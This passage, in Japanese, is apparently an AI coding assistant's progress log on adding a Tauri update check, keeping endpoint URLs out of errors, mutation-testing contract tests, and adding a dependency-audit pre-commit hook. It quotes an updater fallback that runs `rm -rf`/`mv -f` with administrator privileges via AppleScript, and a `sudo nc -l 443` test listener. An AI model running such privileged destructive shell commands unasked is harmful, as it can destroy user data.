正しくは: `check()` は `Update { timeout: None, .. }` を**ハードコード**して返すので、
**15 秒は `download()` に伝播しない＝DL 側が既定で無期限**。055d の課題は「引き継がせないこと」ではなく
**DL に別途上限を張ること**（`configure_client` の `connect_timeout` + `read_timeout`）。

**確認結果**: 「繋がるが応答しない」の実機再現（`/etc/hosts` ＋ `sudo nc -l 443`）は **DevTools 操作が要るため未実施**
（依頼者の手番。手順は 055b タスクファイル末尾に記載）。回帰防止として `.timeout(` の存在は契約テストで固定済み。

**② 選んだ feature と `cargo tree -i openssl-sys` の結果、実際に増えた依存**

```toml
tauri-plugin-updater = { version = "2", default-features = false, features = ["rustls-tls", "zip"] }
```

crate の feature は**全 4 個で `rustls-tls` と `zip` が既定**（他は `native-tls` / `native-tls-vendored`）。
＝この指定は「既定と同じ内容を明示固定した」もの（`image` の `default-features = false` と同型）。
将来 crate 側の既定が変わっても TLS 実装が黙って入れ替わらない。

⚠ **`zip` を落としてはいけない**。`flate2`/`tar`/`zip` が消えて **macOS の `.app.tar.gz` を展開できなくなり、
055d で mac の自己更新だけが死ぬ**——本タスクの `check` では絶対に気付けない壊れ方なので Cargo.toml に明記した。

**OpenSSL 非混入（実測）**: `cargo tree -i openssl-sys` / `-i native-tls` / `-i openssl` の**いずれも
「該当パッケージなし」**。

**実際に増えた依存は 29 crate**（`Cargo.lock` の diff。予想ではなく実測）:

- HTTP: `reqwest` ⚠ / `hyper-rustls`
  - ⚠ `reqwest` は **`Cargo.lock` には従来から在った**が、`tauri` 側の依存が
    `cfg(any(target_os = "android", all(target_vendor = "apple", not(target_os = "macos"))))` の
    **ターゲット限定依存**だったため **macOS/Windows のバイナリには入っていなかった**。**055b で初めてリンクされる**。
    （だから `Cargo.lock` の `+name` diff には現れない。「増えた crate 一覧」だけ見ると見落とす。）
- TLS(rustls): `rustls` / `rustls-webpki` / `rustls-pki-types` / `tokio-rustls` / `rustls-platform-verifier` /
  `rustls-native-certs` / `webpki-root-certs` / `ring` / `untrusted` / `subtle` / `schannel`(Win) /
  `openssl-probe`（**Linux の CA 証明書ファイルの場所を探すだけで OpenSSL をリンクしない**）
- 署名検証: `minisign-verify`
- 展開: `tar` / `zip`(Win/Linux のみ) / `filetime` / `xattr`（`flate2` は既に `png`→`ico`→`tauri-codegen` 経由で在った）
- **macOS の昇格インストール: `osakit` / `objc2-osa-kit`（＝AppleScript 実行）**
- Android 専用（mac/Win では未コンパイル）: `jni` / `jni-macros` / `simd_cesu8` / `simdutf8` /
  `rustls-platform-verifier-android`。その他 `arbitrary` / `derive_arbitrary`（`zip` の optional）/ `windows-sys`(新版)

⚠ **`osakit` は §4「Shell実行は原則使わない」に触れる**ので明記しておく。plugin の `Update::install_inner()` は
アプリ置換が `PermissionDenied` になった**フォールバック時にだけ**
`do shell script "rm -rf '<extract_path>' && mv -f '<tmp>' '<extract_path>'" with administrator privileges` を
OSAKit で実行する。**`check()` からは到達しない**（055b の面はゼロ）が、**この経路の評価と §4/§5 への追記は 055d の領分**。
併せて、その plugin 内部コードは `script.compile().expect("invalid AppleScript")` と `tx.send(r).unwrap()` を含む
＝**こちらのコードでは消せない panic 経路**であることも 055d に申し送った。

**バイナリの実測（リンク後）**: `strings target/debug/stream-dock` で
① endpoint URL は **`https://github.com/satoh23/StreamDock-releases/releases/latest/download/latest.json` の 1 本だけ**
（直後に pubkey と `windows/installMode/passive` が並ぶ＝`plugins.updater` の設定そのもの）
② **`api.github.com` は 1 件も無い** ③ `objects.githubusercontent.com` はハードコードされていない（302 で実行時に決まる）。

**③ `ErrorCode` を追加したか／しなかった理由**

**`UpdateCheckFailed` を 1 個だけ追加した**（`log_message()` は「更新の確認に失敗しました。」）。

- 既存で近いのは `InternalError` だが文言が「予期しないエラーが発生しました。」で、**起動時に自動で走る処理の
  ネットワーク断は想定内**なので実態と食い違う。055c が「更新を確認できませんでした」の静かな表示に落とすとき、
  他の内部エラーと区別できないのも困る。
- **種別（到達不可 / 404 / JSON 破損 / 署名検証失敗）では分けなかった**。理由は ①plugin 側で 404 と JSON 破損が
  `last_error` / `ReleaseNotFound` に合流していて綺麗に分かれない（分けるには公開 API として不安定な enum variant への
  match が要る）②UI 上ユーザーが取れる行動が全ケース同一（後で再試行）③粒度そのものがネットワーク/エンドポイント
  状態の情報になる（§9）。**再修正トリガー＝099b の実機 E2E で「署名検証失敗だけ別扱いにしたい」（鍵ローテ事故の検出）
  が出たら、そのとき 1 個だけ足す。**
- 波及は `error.rs` 2 行と `ErrorCode.ts` の再生成のみ（`log_message()` は網羅 match なのでコンパイラが教える）。
  **この code を DB へ書く経路は作っていない**ので、既存の app_logs レコードには一切出ない。

**④ URL をエラーに載せないための具体策**

`tauri-plugin-updater` の `Error::Reqwest` は **`#[error(transparent)]`** で、reqwest の Display は
`error sending request for url (https://github.com/satoh23/…)` のように **URL をそのまま含む**。
`Error::Network(String)` も `"{0}"`。`e.to_string()` を `AppError.message` に載せると
**フロントにもログにもエンドポイント URL が出る**。

対策は 3 段:

1. `AppError::update_check_failed()` を**引数を取らないコンストラクタ**にした。呼び出し側が生エラーを載せられない。
2. コマンド側は **必ず `map_err(|_| …)`**（`|e|` で束縛しない＝そもそも文字列化できない形にする）。
   `From<rusqlite::Error>` が DB パスを含みうる生エラーを落としているのと**まったく同じ扱い**。
   **`From<tauri_plugin_updater::Error> for AppError` は作らなかった**——`?` で暗黙変換できるようにすると、
   後から `?` を書いた誰かが意図せず漏洩経路を増やせるため。
3. 契約テスト `never_binds_the_raw_updater_error` が **`map_err(` の総数と `map_err(|_|` の数が一致すること**を
   照合する（`|e|` が 1 つでも増えると落ちる）。

**plugin 側のログ**: `check()` には `log::debug!("checking for updates {url}")` が**ある**。ただし本アプリは
`log` の実装（`tauri-plugin-log` / `env_logger`）を 1 つも登録していないので実行時はどこにも出ない。
⚠ **将来ロガーを入れるとこの 1 行で URL が出るようになる**ので、security.md §1 の例外節にその旨を残した。
app_logs（SQLite）へは一切書いていない（新規の保存経路を作らない）。

**⑤ publish 前後の devtools 確認結果**

**未実施（依頼者の手番）。** DevTools コンソールでの `invoke` はこちらから操作できないため、
手順とチェックリストを 055b タスクファイル末尾に残した。**publish 前の前提条件だけは実測で確認済み**:

```
curl -sSL -o /dev/null -w '%{http_code}' https://github.com/satoh23/StreamDock-releases/releases/latest/download/latest.json
→ 404（リダイレクト 0 回）
```

＝ 055a が `draft: true` を維持しているため、いま叩けば必ず「更新の確認に失敗しました」で reject される状態。
**「更新なし（`available:false`）」と「更新あり（`available:true`）」の確認には依頼者による draft の publish が要る。**

**⑥ 「Rust 完全同期」方針を崩した記録**

032c-b 以降ずっと「通信面は Node sidecar に封じ込め、**Rust は完全同期のまま**（async/WS/HTTP crate を足さない）」を
守ってきた。同じ `[dependencies]` の `keyring` に「**同期 API**（Rust 完全同期の要件に適合・tokio 不要）」と
書いてあるのがその方針の記録で、**本タスクはそこを正面から崩す**。

- 自己アップデートは **Tauri プロセス自身が自分を置き換える**性質上 sidecar へ寄せられない
  （sidecar はコメビュ窓を開いている間しか生きておらず、更新チェックの契機＝起動時に存在しない。
  そもそも **plugin 内部の reqwest は sidecar のホストガードを一切通らない**ので、寄せても
  「守られているつもり」になるだけ。032c-a で切ったメイン窓⇄sidecar の依存も復活する）。
- 代替案は 2 つとも成立しない: ①GitHub API 直参照＋手動 DL 誘導は reqwest を避けられる唯一の案だが
  「アプリから更新まで完結」という要望を満たさない ②検出だけ webview `fetch` にする案は、インストールで
  結局 reqwest が要るのに egress ホストだけ 1 つ増える。
- 結果、`check_app_update` が**リポジトリ初の真の `async fn` コマンド**になった（既存の
  `#[tauri::command(async)]` は同期 fn を tokio worker で走らせているだけ）。tokio は Tauri v2 が既に保持。
- **await をまたいで非 Send な値を持たない**ことは構造で担保: このコマンドは **DB State を取らない**ので
  `MutexGuard` を `.await` 跨ぎで保持する余地が無い（引数は `AppHandle` のみ＝`extract_app_icon` と同じ最小権限）。

### そのほかの決定

- **`pub_date` は `Update.raw_json` から取り出した**。`Update.date` は `time::OffsetDateTime` で、文字列化するには
  `time` を**直接依存**に足す必要がある（いまは plugin の推移依存なので `use time::…` は書けない）。
  `raw_json` はサーバ応答そのものなので、そこから RFC3339 文字列のまま抜けば直接依存を増やさずに済む（§10）。
- **`current_version` は `app.package_info().version`**（＝`tauri.conf.json` の version＝**updater が実際に比較する値**）。
  診断画面が出すアプリバージョンは `env!("CARGO_PKG_VERSION")`（＝Cargo.toml）で出どころが違うが、055a の
  `check-version-sync.mjs` が 5 箇所の一致を強制しているので実運用ではズレない。updater の判定と同じ源を返すほうが
  055c の表示と矛盾しない。
- ⚠ **`latest_version` / `notes` / `pub_date` は minisign 署名の対象外**。署名が守るのはダウンロードした実体の
  バイト列だけで、**`latest.json` 自体は署名されていない**（HTTPS で守られるだけ）。
  ＝**055c / 055e はこれらを HTML として解釈してはいけない**。055e が `dangerouslySetInnerHTML` を使わず
  自前の最小マークダウンレンダラを書く決定は、ここで初めて「好み」ではなく**要件**になる。型の doc コメントと
  055c のタスクファイルに残した。
- **`.plugin()` 登録は必須**（外すと `app.updater_builder()` の `state::<UpdaterState>()` が **panic** し、
  まさに避けたかった「Promise 永久未解決」になる）。lib.rs のコメントに残した。

### 検証（実測）

```bash
cargo check   # 通過（警告ゼロ）
cargo build   # 通過（52MB の実バイナリまでリンク＝ring のネイティブコードも含めて確認）
cargo test    # 100 passed / 0 failed（うち契約テスト 4 本 ＋ ts-rs export_bindings）
pnpm --filter ./apps/desktop typecheck   # 通過
pnpm --filter ./apps/desktop lint        # 通過
pnpm --filter ./apps/desktop test        # 465 tests + CSS ガード + バージョン同期ガード すべて緑

cargo tree -i openssl-sys / -i native-tls / -i openssl   # いずれも「該当パッケージなし」

# ゼロ拡大（すべて差分ゼロを確認）
git status --short -- apps/desktop/src-tauri/capabilities/ apps/desktop/src-tauri/tauri.conf.json \
  .github/ apps/comment-sidecar/
# JS 依存（差分は check:bindings の 1 行のみ・dependencies と pnpm-lock.yaml は不変）
git diff -- apps/desktop/package.json pnpm-lock.yaml
```

**`pnpm check:bindings` は現時点で exit 1 になるが、これは正しい挙動**。中身は
`gen:bindings && git diff --exit-code` で、`ErrorCode.ts`（＝今回 `UPDATE_CHECK_FAILED` を足した意図した変更）が
**まだコミットされていない**ために差分として出る。実質の担保は別途取った:
① `gen:bindings` を 2 回走らせても出力が 1 バイトも変わらない（**ドリフト無し**）
② 列挙に足した `src/features/app-update/bindings` はディレクトリ名と一致している。
コミット後は緑になる。⚠ なお新規 bindings は**未追跡の間は `git diff` に出ない**ので、
**コミットして初めて検査対象として機能する**。

**契約テストのミューテーション確認 —— 6/6 一致**（作業ツリー非破壊: 元バイト列を退避 → 書換 → 実行 → `trap` で必ず復元）。
**4 つの変異はいずれも `cargo check --tests` が通ることを確認済み**＝テストが落ちた理由が型エラーではなく
assert であることを確定させた。

| # | 変異 | 期待 | 結果 |
| --- | --- | --- | --- |
| M0 | 無変更（負のコントロール） | 全 PASS | 一致 |
| M1 | `.endpoints(Vec::new())` を実行時に呼ぶ | `does_not_override_endpoints_at_runtime` FAIL | 一致 |
| M2 | `check()` の `map_err` を `unwrap()` に戻す | `has_no_panicking_unwrap_or_expect` FAIL | 一致 |
| M3 | `.timeout(CHECK_TIMEOUT)` を削除 | `keeps_the_hang_guard` FAIL | 一致 |
| M4 | `map_err(\|e\| …)` でエラー値を束縛 | `never_binds_the_raw_updater_error` FAIL | 一致 |
| — | 復元後 | 全 PASS | 一致 |

差分は `apps/desktop/package.json` / `Cargo.toml` / `Cargo.lock` / `src/error.rs` / `src/lib.rs` /
`src/features/tools/bindings/ErrorCode.ts` / `docs/security.md` の 7 ファイルと、
新規 `src-tauri/src/app_update/`（2 本）/ `src/features/app-update/`（3 本）。

### 055c へ渡す情報

- **型**: `AppUpdateStatus { currentVersion: string; available: boolean; latestVersion?: string; notes?: string; pubDate?: string }`
  （`src/features/app-update/bindings/AppUpdateStatus.ts`）。呼び出しは `checkAppUpdate()` 1 本だけ。
- **「更新なし」と「確認できなかった」の区別**:
  - 更新なし ＝ **resolve** して `available: false`
  - 確認できなかった ＝ **reject**（`AppError` の `code: "UPDATE_CHECK_FAILED"`）。
    到達不可 / エンドポイント 404 / JSON 破損 / 署名検証失敗が**すべて**ここに来る。
  - ⚠ **`catch` して `available: false` に潰さないこと**（潰すと 2 つが区別できなくなる）。
- **タイムアウト既定 15 秒**。この Promise が永久 pending になることはないので、
  「確認中」表示のための自前タイマーは不要。
- **自動チェックの発火（起動時フック）は 055c の担当**。055b は呼ばれるまで何もしない。
- ⚠ **`notes` は未署名データ**なので **HTML として解釈しない**（055e の自前レンダラ前提）。

### 未完了・次にやること

1. **実機 DevTools 確認**（依頼者）—— publish 前の 404 / 到達不可 / 「応答しないネットワーク」の 3 つ。
   手順は 055b タスクファイル末尾。
2. **draft の publish**（依頼者・GitHub Web UI）→ そのあと `available:false` と `available:true` の確認。
   ⚠ version を下げる検証中は `pnpm test` が赤くなる（`check-version-sync.mjs` の**戻し忘れ検出装置**として正しい挙動）。
3. **security-review**（本セッションで実施）。
4. **コミットは未実施**（依頼者の明示指示待ち）。

### 追補（依存の脆弱性検査 —— 依頼者の指摘で追加実施・2026-08-01）

依頼者から「**取り込んだサードパーティのライブラリが安全であるという調査はしているか**」と問われ、
**していなかった**ことが判明した。security-review では「増えた依存の一覧化」「OpenSSL 非混入」「`osakit` の発見」
までしかやっておらず、**既知脆弱性との照合をしていなかった**。

**まず判明した構造的な穴**（実測）: 本リポジトリには**依存の脆弱性検査の仕組みがそもそも無い**。
`cargo audit` / `cargo deny` は未インストール、`.github/dependabot.yml` なし、CI に検査ステップなし、
過去の progress にも実施記録なし。security.md §10 は「**理由を説明する**」ことは求めていたが
**既知脆弱性との照合は求めていない**＝ルールは守っていたが検査はしていなかった、という状態だった。
**055b で穴が空いたのではなく、最初から空いていた穴が 30 crate 増えたことで目立った**、が正確。

**実施内容と結果**（`cargo install cargo-audit --locked` → `cargo audit`）:

- advisory DB 1177 件・`Cargo.lock` の **561 crate** を走査（今回増えた分だけでなく全依存）。
- **脆弱性（vulnerabilities）は 0 件**（exit code 0）。
- 警告 18 件はすべて `unmaintained`(16) / `unsound`(2)。**055b が増やした 30 crate には 1 件も該当なし**
  （`ring` / `rustls` / `reqwest` / `hyper-rustls` / `minisign-verify` / `tar` / `zip` / `osakit` 等はすべて無警告）。
- 18 件の内訳（いずれも Tauri 由来・055b と無関係）:
  - **13 件は Linux 専用**（GTK3 バインディング群と `event-listener`〈zbus→D-Bus〉）。`cargo tree` で
    **mac/Windows ではコンパイルされない**ことを確認（本アプリは Linux を配布対象にしていない）。
  - **5 件は `unic-*`**（`urlpattern`→`tauri-utils`。Tauri の URL パターン解析）。macOS でも依存グラフには現れるが
    到達経路は `tauri-macros`（proc-macro＝コンパイル時）で、debug バイナリの文字列走査でも `unic` 由来は 0 件。
    いずれも「メンテナンス停止」の警告で**脆弱性ではない**。

**併せて記録した事実（security-review で書き漏らしていた）**:

- ⚠ **`ring` は pure-Rust ではない**（**C 17 ファイル・アセンブリ 111 ファイル**）。`Cargo.toml` の既存コメントは
  過去の依存について「いずれも pure-Rust」と繰り返してきたので、**055b でその前提が初めて崩れた**。
  `ring` は rustls が使う暗号実装で、速度のためのアセンブリは業界標準だが、方針の変化として記録する。
- 増えた 30 crate のうち **`build.rs`（取り込み時に任意コードが走る面）を持つのは `ring` と `rustls` の 2 つだけ**
  ＝サプライチェーン上の最大リスク面は小さい。

**やっていないこと（正直な限界）**: 各 crate のソース読解／作者の素性・タイプスクワッティングの確認／
バージョン固定の妥当性評価。これらは 29 crate を人力で追う話で、現実的でない。
また **`cargo audit` は「今日のスナップショット」に過ぎない**——継続検査の仕組み（CI の `cargo audit` ステップ／
Dependabot／JS 側の `pnpm audit`）は**まだ無い**ので、**別タスクとして起票した**
（CLAUDE.md の「1 回の作業で複数機能をまとめて実装しない」に従い 055b には混ぜない）。

**この追補で増えたコード差分はゼロ**（`docs/security.md` §10 と本ファイルへの追記のみ。
`cargo-audit` は開発機のツールで、アプリの依存には入らない）。

### security-review の結果（2026-08-01・実施済み）

判定は **「軽微な懸念あり・修正必須 0 件」**。必須級の観点はすべて実測で裏が取れた
（宛先 1 本・`api.github.com` 0 件・capability 差分ゼロ・panic 経路なし・ハングガードあり・URL 非掲載・
shell/fs/process ゼロ・引数ゼロ・ログゼロ）。指摘は以下。

- **S-1【最重要の残課題】`.plugin()` 登録が機械で守られていない。** `.plugin(tauri_plugin_updater::Builder::new().build())`
  を消しても**コンパイルは通り、実行時に `state::<UpdaterState>()` が panic する**＝本タスクで塞いだはずの
  「invoke の Promise が永久未解決」が復活する。いま守っているのは lib.rs のコメント 1 行だけで、
  契約テストは `commands.rs` しか見ていない。修正方針は `lib.rs` の既存 `mod pinned_overlay_contract` に
  `assert!(LIB_RS.contains(&format!("{}::Builder::new().build()", "tauri_plugin_updater")))` を 1 行足すこと
  （needle を実行時に組むのは同モジュール既存の注意点と同じ理由）。
  **→ 依頼者の判断で 055c に送った**（起動時の自動チェックを配線して初めて実際に呼ばれる経路ができるため、
  そのときセットで入れる）。055c のタスクファイルに追記済み。
- **S-2 reqwest は既定でプロキシ環境変数を尊重する。** `no_proxy()` を呼んでいないため `HTTPS_PROXY` 等が効く
  ＝**URL はコンパイル時定数でも、パケットの経路は環境変数で変えられる**。TLS 検証（`danger_accept_invalid_certs`
  不使用）と minisign が効くので中身の改竄・盗聴はできない。`no_proxy()` で塞ぐ選択もあるが、
  **企業プロキシ配下で更新できなくなるので推奨しない**（未実測・plugin 実装から読める挙動）。
- **S-3 応答ボディにサイズ上限が無い**（plugin 側に上限が無く、実質 15 秒で落とせる量が上限）。
  前提が「GitHub 侵害時」なので優先度は低く、fork しない限り塞げない。受容した制約として記録する。
- **S-4 多重実行ガード・レート制限が無い**（窓生成コマンドの `WINDOW_OPEN_LOCK` に相当するものが無い）。
  055c 側で「実行中は再実行しない」「失敗時に無限リトライしない」を守ること。
- **S-5 `notes` の長さが無制限**（表示時の丈の制御は 055c の領分）。

### 追補2（依存の脆弱性検査を pre-commit ゲートにした —— 依頼者の指示で 055b と同時に実施・2026-08-01）

上の追補で「継続検査の仕組みが無い」と書き、CLAUDE.md の「1 回の作業で複数機能をまとめて実装しない」を理由に
**別タスク（056）を提案した**が、依頼者の判断で**本タスク内で実施**することになった。
理由は「**CI ではなく pre-commit のほうが手戻りが少ない**」——壊れた依存を持ち込んだコミットが push されて
CI で初めて落ちると、そこから直すのは手戻りになる。コミットの時点で止めれば、まだ手元にあるうちに気づける。
懸念（スコープを混ぜること）は伝えたうえで、依頼者の決定を優先した。

**実装（新規依存ゼロ）**

- **`.githooks/pre-commit`（新規・実行権限あり）**。root `package.json` に
  `"prepare": "git config core.hooksPath .githooks"` を足し、**`pnpm install` で自動設定**されるようにした
  （husky / lefthook / simple-git-hooks は入れない＝§10 の方針と整合。`prepare` が pnpm install で走ることは実測確認）。
- 手動実行用に `"audit:deps": "cargo audit -f apps/desktop/src-tauri/Cargo.lock && pnpm audit --prod"` も追加。
- README の「セットアップ」に `cargo install cargo-audit --locked` と hook の説明を追記。

**設計判断（なぜこの形か）**

| 判断 | 理由 |
| --- | --- |
| **ロックファイルがステージされたときだけ走る** | **速度とオフライン問題を同時に解く**。①依存が変わらないコミットは即 exit 0（無出力・0 秒）②どちらの audit も外部へ問い合わせるので毎回走らせると機内でコミットできなくなるが、**ロックファイルを更新できた＝直前にオンラインだった**はずなのでこの条件ならほぼ起きない |
| **Rust は `cargo audit` の既定** | **脆弱性でのみ落ちる**。`unmaintained`/`unsound` の警告（現状 18 件）では落ちない。ここで落とすと**初日から常時赤**になり hook が「無視するもの」に成り下がる。警告でも落としたくなったら `-D warnings` |
| **JS は `pnpm audit --prod`** | `--prod` 無しだと**開発依存の 5 件で必ず落ちる**（下記）。`--prod`＝**実際に配られる依存**は 0 件で、今日から緑で運用できる |
| **`cargo-audit` 未導入なら fail-closed** | 「ツールが無い」を「問題なし」と読み替えない（security.md の一貫した方針）。ロックを変えるコミットでしか出ないので日常を止めない |
| **成功時は 1 行だけ出力** | `cargo audit` は毎回 18 件の警告を吐く。そのまま流すとコミットのたびに画面が埋まり、**本当に落ちた日に気づけない**。失敗時のみ全文を出す |

**ミューテーション確認 —— 6/6 一致**（index が空であることを確認したうえで stage → 実行 → `git reset`。
`Cargo.lock` を差し替えるケースは元バイト列を退避し `trap` で必ず復元）

| # | ケース | 期待 | 結果 |
| --- | --- | --- | --- |
| T0 | 何もステージしていない（負のコントロール） | 即通過・無出力 | 一致 |
| T1 | 実物の `Cargo.lock` をステージ | 通過（`[OK]` 1 行） | 一致 |
| T2 | `pnpm-lock.yaml` をステージ | 通過 | 一致 |
| T3 | `cargo-audit` を PATH から隠す | **中止**（fail-closed） | 一致 |
| T4 | 脆弱性入りの `Cargo.lock`（`time` 0.1.44 / RUSTSEC-2020-0071） | **中止**（詳細を表示） | 一致 |
| — | 復元後 | 通過 | 一致 |

**JS 側で新たに判明したこと（`pnpm audit`）**

- **配布される依存（`--prod`）は 0 件**。
- **開発専用の依存に 5 件**（high 4 / moderate 1）: `brace-expansion`×3（eslint / typescript-eslint 経由・DoS）、
  `postcss`（vite 経由・パストラバーサル）、`esbuild`（sidecar のビルド用・**dev server** の問題で、
  本プロジェクトはバンドル用途にしか使っていない）。**いずれもユーザーへ配るバイナリには入らない**。
  免罪したわけではないので **task-board の 056 に残した**。

**⚠ この hook で塞げていないこと（正直な限界）**

- **依存が変わっていなくても脆弱性は日々公表される。** この hook は「自分が依存を変えたとき」しか見ないので、
  **既存依存に後から報告されたものは捕まえられない**。定期実行（Dependabot／スケジュール CI）が別途要る
  ＝ **task-board の 056 に残り①として明記**。
- `git commit --no-verify` で飛ばせる（飛ばしたら理由を progress.md に残す運用にした）。
- `cargo audit` は**ディスク上の `Cargo.lock`** を読むため、`git add -p` 等でステージ内容と作業ツリーが
  食い違う場合は作業ツリー側を検査する（実運用では起きにくいので許容・hook のコメントに明記）。
- `cargo audit` が見るのは「**すでに誰かが見つけて報告された危険**」だけ。未報告のものや
  悪意を持って仕込まれてバレていないものは検出できない（どのツールでも同じ）。

**この追補で増えたアプリのコード差分はゼロ**（`.githooks/pre-commit` 新規・root `package.json` の scripts 2 行・
README・security.md・task-board・本ファイルのみ。`apps/` 配下の実装は 1 バイトも変わっていない）。

### 追補3（別チャットでのセキュリティ／品質レビューと、その対応・2026-08-01）

上の「security-review の結果」は**実装者の自己レビュー**だったため、別チャットで独立検証を依頼した。
crate ソース（`tauri-plugin-updater` 2.10.1 / `reqwest` 0.13.4）の読解・バイナリの `strings`・
契約テストと pre-commit のミューテーション再現まで含めて追試され、**主張のうち 1 件が事実と逆**と判明した。

**独立に再現された主張**（＝自己申告が正しかったもの）: capability/`tauri.conf.json`/CI/sidecar/JS 依存の差分ゼロ、
`cargo tree` の OpenSSL 非混入 3 本、バイナリの endpoint 1 本・`api.github.com` 0 件、契約テストのミューテーション 4/4、
pre-commit のミューテーション（未ステージ→通過／`cargo-audit` を隠す→fail-closed／脆弱 lock→FAIL）、
404 が `Err`（204 だけ `Ok(None)`）、`Error::Reqwest` の transparent と reqwest Display の URL 混入、静的検証すべて緑。

**レビューで新たに判明した事実（自己申告に無かったもの）**:

- plugin が送る User-Agent は **plugin 自身の `tauri-plugin-updater/<version>`**（`env!` は plugin crate の値）で、
  アプリ名もアプリバージョンも載らない。ヘッダは他に `Accept: application/json` のみ。
  ＝「送信するアプリ側データはゼロ」は文字どおり正しいことが裏付けられた。
- `validate_endpoints` は **release ビルドでは非 https の endpoint を `Err`** にする（debug は警告のみ）。
- `pnpm audit --prod` は **sidecar の production 依存（`ws` / `@grpc/grpc-js` / `obs-websocket-js` 等）も検査する**。
  除外される 5 件はすべて devDependencies 経由＝「配布物の依存を隠している」わけではない。
- `.git/hooks` にサンプル以外が無いことを確認（`core.hooksPath` 設定による回帰はゼロ）。

**修正した指摘**:

1. **【必須】`.timeout()` が `download()` に伝播するという記述が事実と逆だった（4 箇所）。**
   `updater.rs` を読むと `UpdaterBuilder::build()` は `Updater { timeout: self.timeout }` を作るが、
   **`Updater::check()` が返す `Update` は `timeout: None` をハードコード**しており、
   `Update::download()` が見るのはそちら。＝**DL 側は既定で無期限**で、実態は申し送りと逆だった。
   危険なのは誤誘導の向きで、055d が「timeout 無しの updater を別途 build」すると
   **055b が塞いだ「Promise 永久未解決」を DL 側で作る**（しかも長時間・高確率）。
   `commands.rs` の `CHECK_TIMEOUT` doc / security.md §1 / 本ファイル / 055b・055d のタスクファイルを訂正し、
   正しい対処（`configure_client` の `connect_timeout` + `read_timeout`。`configure_client` は
   `Update` に**持ち越される**）を書き直した。⚠ 「`configure_client` は持ち越されない」も誤りだった。
2. **S-1（`.plugin()` 登録の機械固定）を 055c 送りから引き戻して実装した。**
   先送りの根拠 2 つがどちらも成立しないと指摘された——①依頼者がこれから行う実機 DevTools 確認が
   **今日その経路を通る**（4 窓すべてから呼べる）②`lib.rs` の `mod pinned_overlay_contract` に
   **`LIB_RS` と `format!` の作法が既にあり**、追加は 1 テストで済む。
   `updater_plugin_stays_registered` を追加し、055c のタスクファイルからは必須項目を消した。
3. **契約テストを 4 点補強**（いずれも「本体を削除する変異」は殺せていたが、**別の壊し方に無力**だった）。
   ⚠ **この作業中に、この手法の最悪の欠陥を実地で踏んだ**ので詳しく残す:
   - **《本命》`include_str!` の自己ヒットが「コメントを書くほどガードが緩む」形になっていた。**
     最初に上の 3 点を修正したとき、**その修正を説明するコメント自身が needle にヒットし、
     `keeps_the_hang_guard` / `never_binds_the_raw_updater_error` / `updater_plugin_stays_registered` の
     3 つが同時に骨抜きになった**（本体を削除しても全部 PASS する状態）。ミューテーションを回さなければ
     「テストが緑だから守られている」と誤認したまま終わっていた。
     対策として **行コメントを除いてから照合する `code_only()` を入れた**（`lib.rs` 側も同様）。
     これで「説明を丁寧に書くほど検査が緩む」という逆立ちした性質が消える。needle を実行時に組む
     従来の作法は、コード行の文字列リテラル（assert メッセージ等）に対する二重の保険として残した。
     ＝**元の `pinned_overlay_contract` が「罠」と書いていたものは、注意では防げない構造的欠陥だった。**
   - `keeps_the_hang_guard` の needle を `.timeout(` から**実引数まで含めた形**に変更。
     旧 needle は「定数を残したまま値を 1 時間に書き換える」変異を素通しした（＝消されるだけでなく
     **緩められること**も防ぐ）。
   - `never_binds_the_raw_updater_error` の等値照合は `map_err` 全廃で **`0 == 0` で空虚に通る**
     （`match` で `Err(e) =>` と書く形）→ 下限本数 `>= 2` の assert を追加。
     ⚠ この assert も `code_only()` が無いとコメント中の `map_err(|_| …)` で満たされてしまい無効だった。
   - `has_no_panicking_unwrap_or_expect` がテスト名の約束に反して 2 語しか見ていなかった
     → panic 系マクロ 4 語（`panic!` / `todo!` / `unimplemented!` / `unreachable!`）を追加。
   - モジュール doc の「3 つの不変条件」→「4 つ」（テストは 4 本ある）。
   - **補強後にミューテーション 9 本を回して全部 kill を確認**（timeout の 削除／値を 1 時間に緩める／
     コメント化、`map_err` 全廃＋生エラー文字列化、`map_err(|e|)` 混入、`panic!` 混入、`unwrap()` 混入、
     `.endpoints()` 追加、plugin 登録の削除）。作業ツリーは shasum で復元確認済み。
   - **今後この手法を増やすなら `code_only()` 相当を必ず通すこと。** 通さないものは
     「書いた本人がコメントで壊す」ため、テストがあること自体が誤った安心になる。
4. **`zip` feature の壊れ方の記述が誤り（4 箇所）。** plugin の `#[cfg(target_os = "macos")] impl Update` は
   `flate2`/`tar` を **feature gate 無しで**使っており、この 2 つは `zip` feature でしか有効化されない
   optional 依存＝落とすと **macOS では `cargo check` の時点でコンパイルエラー**になる。
   「更新チェックでは気付けないサイレントな壊れ方」は誤りで、実際は必ず気付く。結論（落とすな）は変わらない。
5. **security.md §1 の「実行時にもフロントからも差し替えない」の書きぶりを補強。**
   URL については正確だが、読み手は「パケットの行き先が動かせない」と読む。実際は
   reqwest の既定が `auto_sys_proxy: true` なので **`HTTPS_PROXY` / `ALL_PROXY` で経路は変えられる**
   （TLS 検証と minisign で改竄・盗聴は不成立。`no_proxy()` は企業プロキシを壊すので採らない）。
   「**不変なのは URL であって経路ではない**」を明記した。
6. **その他の追記**: S-3（応答ボディにサイズ上限が無い＝受容した制約）を security.md §1 へ／
   `pnpm audit --prod` が sidecar の配布依存も見ることを §10 へ／`git commit` が
   **開発機側で外部通信 2 本**を行うようになったことを §10 へ／`core.hooksPath` が `.git/hooks` を
   無効化することを §10 と README へ／`prepare` が **release CI の `pnpm install` でも走る**ことを §10 へ／
   **`git merge` / `git pull` の依存変更は pre-commit を素通りする**ことを hook・§10・README・task-board へ。

**コメントのみで済ませた指摘（修正不要と判断）**:

- **`pub_date` を `raw_json` から抜く判断**は妥当（`raw_json` は `RemoteRelease` デシリアライズ前の
  サーバ応答そのもの＝前提も正しい）。ただし**キー名や型が違うと `as_str()` → `None` で静かに欠落し、
  panic もエラーも出ない＝テストでは絶対に捕まらない**ため、その旨と再修正トリガー
  （publish 後に `pubDate` が `undefined` なら `make-latest-json.mjs` と突き合わせる）をコードに残した。
- **`REPO_ROOT=$(git rev-parse …)` の失敗を見ていない**のは、失敗しても fail-closed に倒れるため許容。
  ただしメッセージが誤解を招く旨を hook のコメントに残した。
- **`Option<T>` + `#[ts(optional)]` が `null` を送る**のはリポジトリ全体の既存作法（`skip_serializing_if` は
  **0 箇所**）なのでここで発明しない。代わりに **055c が `!== undefined` で書くと壊れる**ことを
  055c のタスクファイルに明記した（テストのフィクスチャはキーごと省略しているので再現できない）。
- **`unwrap` 禁止を lint（`clippy::unwrap_used`）へ移す**案は、既存の `db.lock().expect(…)` 等と
